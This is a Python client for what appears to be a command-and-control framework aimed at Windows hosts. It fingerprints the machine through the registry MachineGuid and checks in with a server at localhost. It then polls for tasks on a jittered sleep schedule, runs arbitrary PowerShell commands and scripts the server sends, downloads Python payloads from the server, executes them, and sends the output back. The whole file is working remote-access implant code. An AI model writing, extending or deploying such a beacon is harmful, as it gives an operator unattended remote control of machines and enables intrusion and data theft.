# ...existing code...
import time
import requests
import random
import uuid
import subprocess
import signal
import atexit
import threading
import sys

SLEEP_MIN = 10     # Minimum sleep in seconds
SLEEP_MAX = 30     # Maximum sleep in seconds
SERVER_URL = "http://127.0.0.1:8000/"

# generate a uuid for the client
def generate_client_id():
    return str(uuid.uuid4())

def get_machine_id():
    """Return a stable machine identifier on Windows, try registry -> wmic -> MAC-based UUID."""
    try:
        import winreg
        key = winreg.OpenKey(
            winreg.HKEY_LOCAL_MACHINE,
            r"SOFTWARE\Microsoft\Cryptography",
            0,
            winreg.KEY_READ | getattr(winreg, "KEY_WOW64_64KEY", 0)
        )
        machine_guid, _ = winreg.QueryValueEx(key, "MachineGuid")
        return machine_guid
    except Exception:
        try:
            out = subprocess.check_output(["wmic", "csproduct", "get", "uuid"], stderr=subprocess.DEVNULL, text=True)
            lines = [l.strip() for l in out.splitlines() if l.strip() and "UUID" not in l.upper()]
            if lines:
                return lines[0]
        except Exception:
            pass
        # Last fallback: MAC-derived UUID (not perfectly stable across NIC changes)
        return str(uuid.UUID(int=uuid.getnode()))


STOP_EVENT = threading.Event()


def check_in():
    machine_id = get_machine_id()
    try:
        response = requests.post(f"{SERVER_URL}checkin", params={"machine_id": machine_id}, timeout=5)
        print(response.text)
        if response.status_code == 200:
            print(f"Checked in with machine_id: {machine_id}")
        else:
            print("Check-in failed")
    except Exception as e:
        print(f"Check-in error: {e}")


def get_tasks():
    """Return tuple (tasks_list, recommended_sleep_seconds).

    Server now suggests a recommended_sleep value in the tasks response so clients
    can back off when no tasks are available.
    """
    machine_id = get_machine_id()
    try:
        response = requests.get(f"{SERVER_URL}tasks", params={"machine_id": machine_id}, timeout=5)
        if response.status_code == 200:
            data = response.json()
            tasks = data.get("tasks", [])
            rec = data.get("recommended_sleep")
            try:
                rec = float(rec) if rec is not None else None
            except Exception:
                rec = None
            return tasks, rec
        else:
            print(f"Get-tasks failed: {response.status_code}")
    except Exception as e:
        print(f"Get-tasks error: {e}")
    return [], None


def submit_task(task_id: str, result: str):
    machine_id = get_machine_id()
    try:
        # POST result in JSON body so larger payloads are supported
        payload = {"machine_id": machine_id, "task_id": task_id, "result": result}
        response = requests.post(f"{SERVER_URL}submittask", json=payload, timeout=10)
        try:
            print(response.text)
        except Exception:
            pass
    except Exception as e:
        print(f"Submit-task error (ignored): {e}")


def execute_task(task: dict) -> str:
    """Execute a task dict and return combined stdout/stderr as string.
    Task format: {"task_id": "1", "type": "CMD"/"SCRIPT", "command": "...", "script": "..."}
    """
    ttype = task.get("type", "").upper()
    try:
        if ttype == "CMD":
            cmd = task.get("command", "")
            # Run the command in PowerShell
            proc = subprocess.run(["powershell", "-Command", cmd], capture_output=True, text=True, timeout=60)
            out = proc.stdout or ""
            err = proc.stderr or ""
            return out + ("\nERR:\n" + err if err else "")
        elif ttype == "SCRIPT":
            script = task.get("script", "")
            import tempfile, os
            tf = None
            try:
                tf = tempfile.NamedTemporaryFile(delete=False, suffix=".ps1", mode="w", encoding="utf-8")
                tf.write(script)
                tf.close()
                proc = subprocess.run(["powershell", "-File", tf.name], capture_output=True, text=True, timeout=300)
                out = proc.stdout or ""
                err = proc.stderr or ""
                return out + ("\nERR:\n" + err if err else "")
            finally:
                if tf is not None:
                    try:
                        os.unlink(tf.name)
                    except Exception:
                        pass
        elif ttype in ("PY", "PAYLOAD"):
            payload_name = task.get("payload_name") or task.get("command") or task.get("script") or ""
            if not payload_name:
                return "No payload specified"
            # fetch payload from server
            try:
                r = requests.get(f"{SERVER_URL}payload", params={"file_name": payload_name}, timeout=5)
                if r.status_code == 200:
                    data = r.json()
                    content = data.get("content")
                    if not content:
                        return "Payload not found on server"
                else:
                    return f"Failed to fetch payload: {r.status_code}"
            except Exception as e:
                return f"Error fetching payload: {e}"

            import tempfile, os
            tf = None
            try:
                tf = tempfile.NamedTemporaryFile(delete=False, suffix=".py", mode="w", encoding="utf-8")
                tf.write(content)
                tf.close()
                # execute with same python interpreter
                proc = subprocess.run([sys.executable, tf.name], capture_output=True, text=True, timeout=300)
                out = proc.stdout or ""
                err = proc.stderr or ""
                return out + ("\nERR:\n" + err if err else "")
            finally:
                if tf is not None:
                    try:
                        os.unlink(tf.name)
                    except Exception:
                        pass
        else:
            return f"Unknown task type: {ttype}"
    except subprocess.TimeoutExpired:
        return "Task execution timed out"
    except Exception as e:
        return f"Task execution error: {e}"


def check_out():
    """Notify server we are going offline. Best-effort; don't raise on failures."""
    machine_id = get_machine_id()
    try:
        response = requests.post(f"{SERVER_URL}checkout", params={"machine_id": machine_id}, timeout=5)
        try:
            print(response.text)
        except Exception:
            pass
        if response.status_code == 200:
            print(f"Checked out machine_id: {machine_id}")
        else:
            print("Check-out reported non-200 status")
    except Exception as e:
        print(f"Check-out error (ignored): {e}")


def _handle_exit(signum=None, frame=None):
    # mark stop and attempt a checkout; keep this quick and best-effort
    if not STOP_EVENT.is_set():
        STOP_EVENT.set()
        try:
            check_out()
        except Exception:
            pass
    # exit after attempting checkout
    try:
        sys.exit(0)
    except SystemExit:
        # in some environments sys.exit may not terminate immediately
        pass


# register handlers
atexit.register(check_out)
signal.signal(signal.SIGINT, _handle_exit)
# SIGBREAK is raised on Ctrl+Break on Windows
if hasattr(signal, 'SIGBREAK'):
    signal.signal(signal.SIGBREAK, _handle_exit)


def main():
    check_in()
    try:
        while not STOP_EVENT.is_set():
            # determine sleep time: honor server suggestion when present, otherwise use local bounds
            tasks, suggested = get_tasks()
            if tasks:
                # process tasks immediately, skip sleeping below so we loop faster when work exists
                for t in tasks:
                    task_id = t.get("task_id") or t.get("id") or "unknown"
                    print(f"Executing task {task_id} (type={t.get('type')})")
                    result = execute_task(t)
                    submit_task(task_id, result)
                # after processing, pick a short sleep so we can pick up additional tasks quickly
                sleep_duration = SLEEP_MIN
            else:
                # no tasks — if server suggested a sleep interval, use it (with a bit of jitter)
                if suggested is not None:
                    # add jitter +/-20% to avoid thundering herd
                    jitter = suggested * 0.2
                    sleep_duration = max(1, int(suggested + random.uniform(-jitter, jitter)))
                else:
                    sleep_duration = random.randint(SLEEP_MIN, SLEEP_MAX)
            print(f"Sleeping for {sleep_duration} seconds...")
            # report upcoming sleep to server so server can display status
            try:
                machine_id = get_machine_id()
                requests.post(f"{SERVER_URL}status_update", params={"machine_id": machine_id, "sleeping_for": sleep_duration}, timeout=3)
            except Exception:
                # ignore status update failures — best-effort
                pass
            # wait can be interrupted by signals; STOP_EVENT.wait returns True if event set
            STOP_EVENT.wait(sleep_duration)
            if STOP_EVENT.is_set():
                break
            # No more regular check_in on every loop — initial check_in happens on start.
            # Continue to next loop where we'll call get_tasks() again and honor server's suggestion.
    except KeyboardInterrupt:
        _handle_exit()


if __name__ == "__main__":
    main()
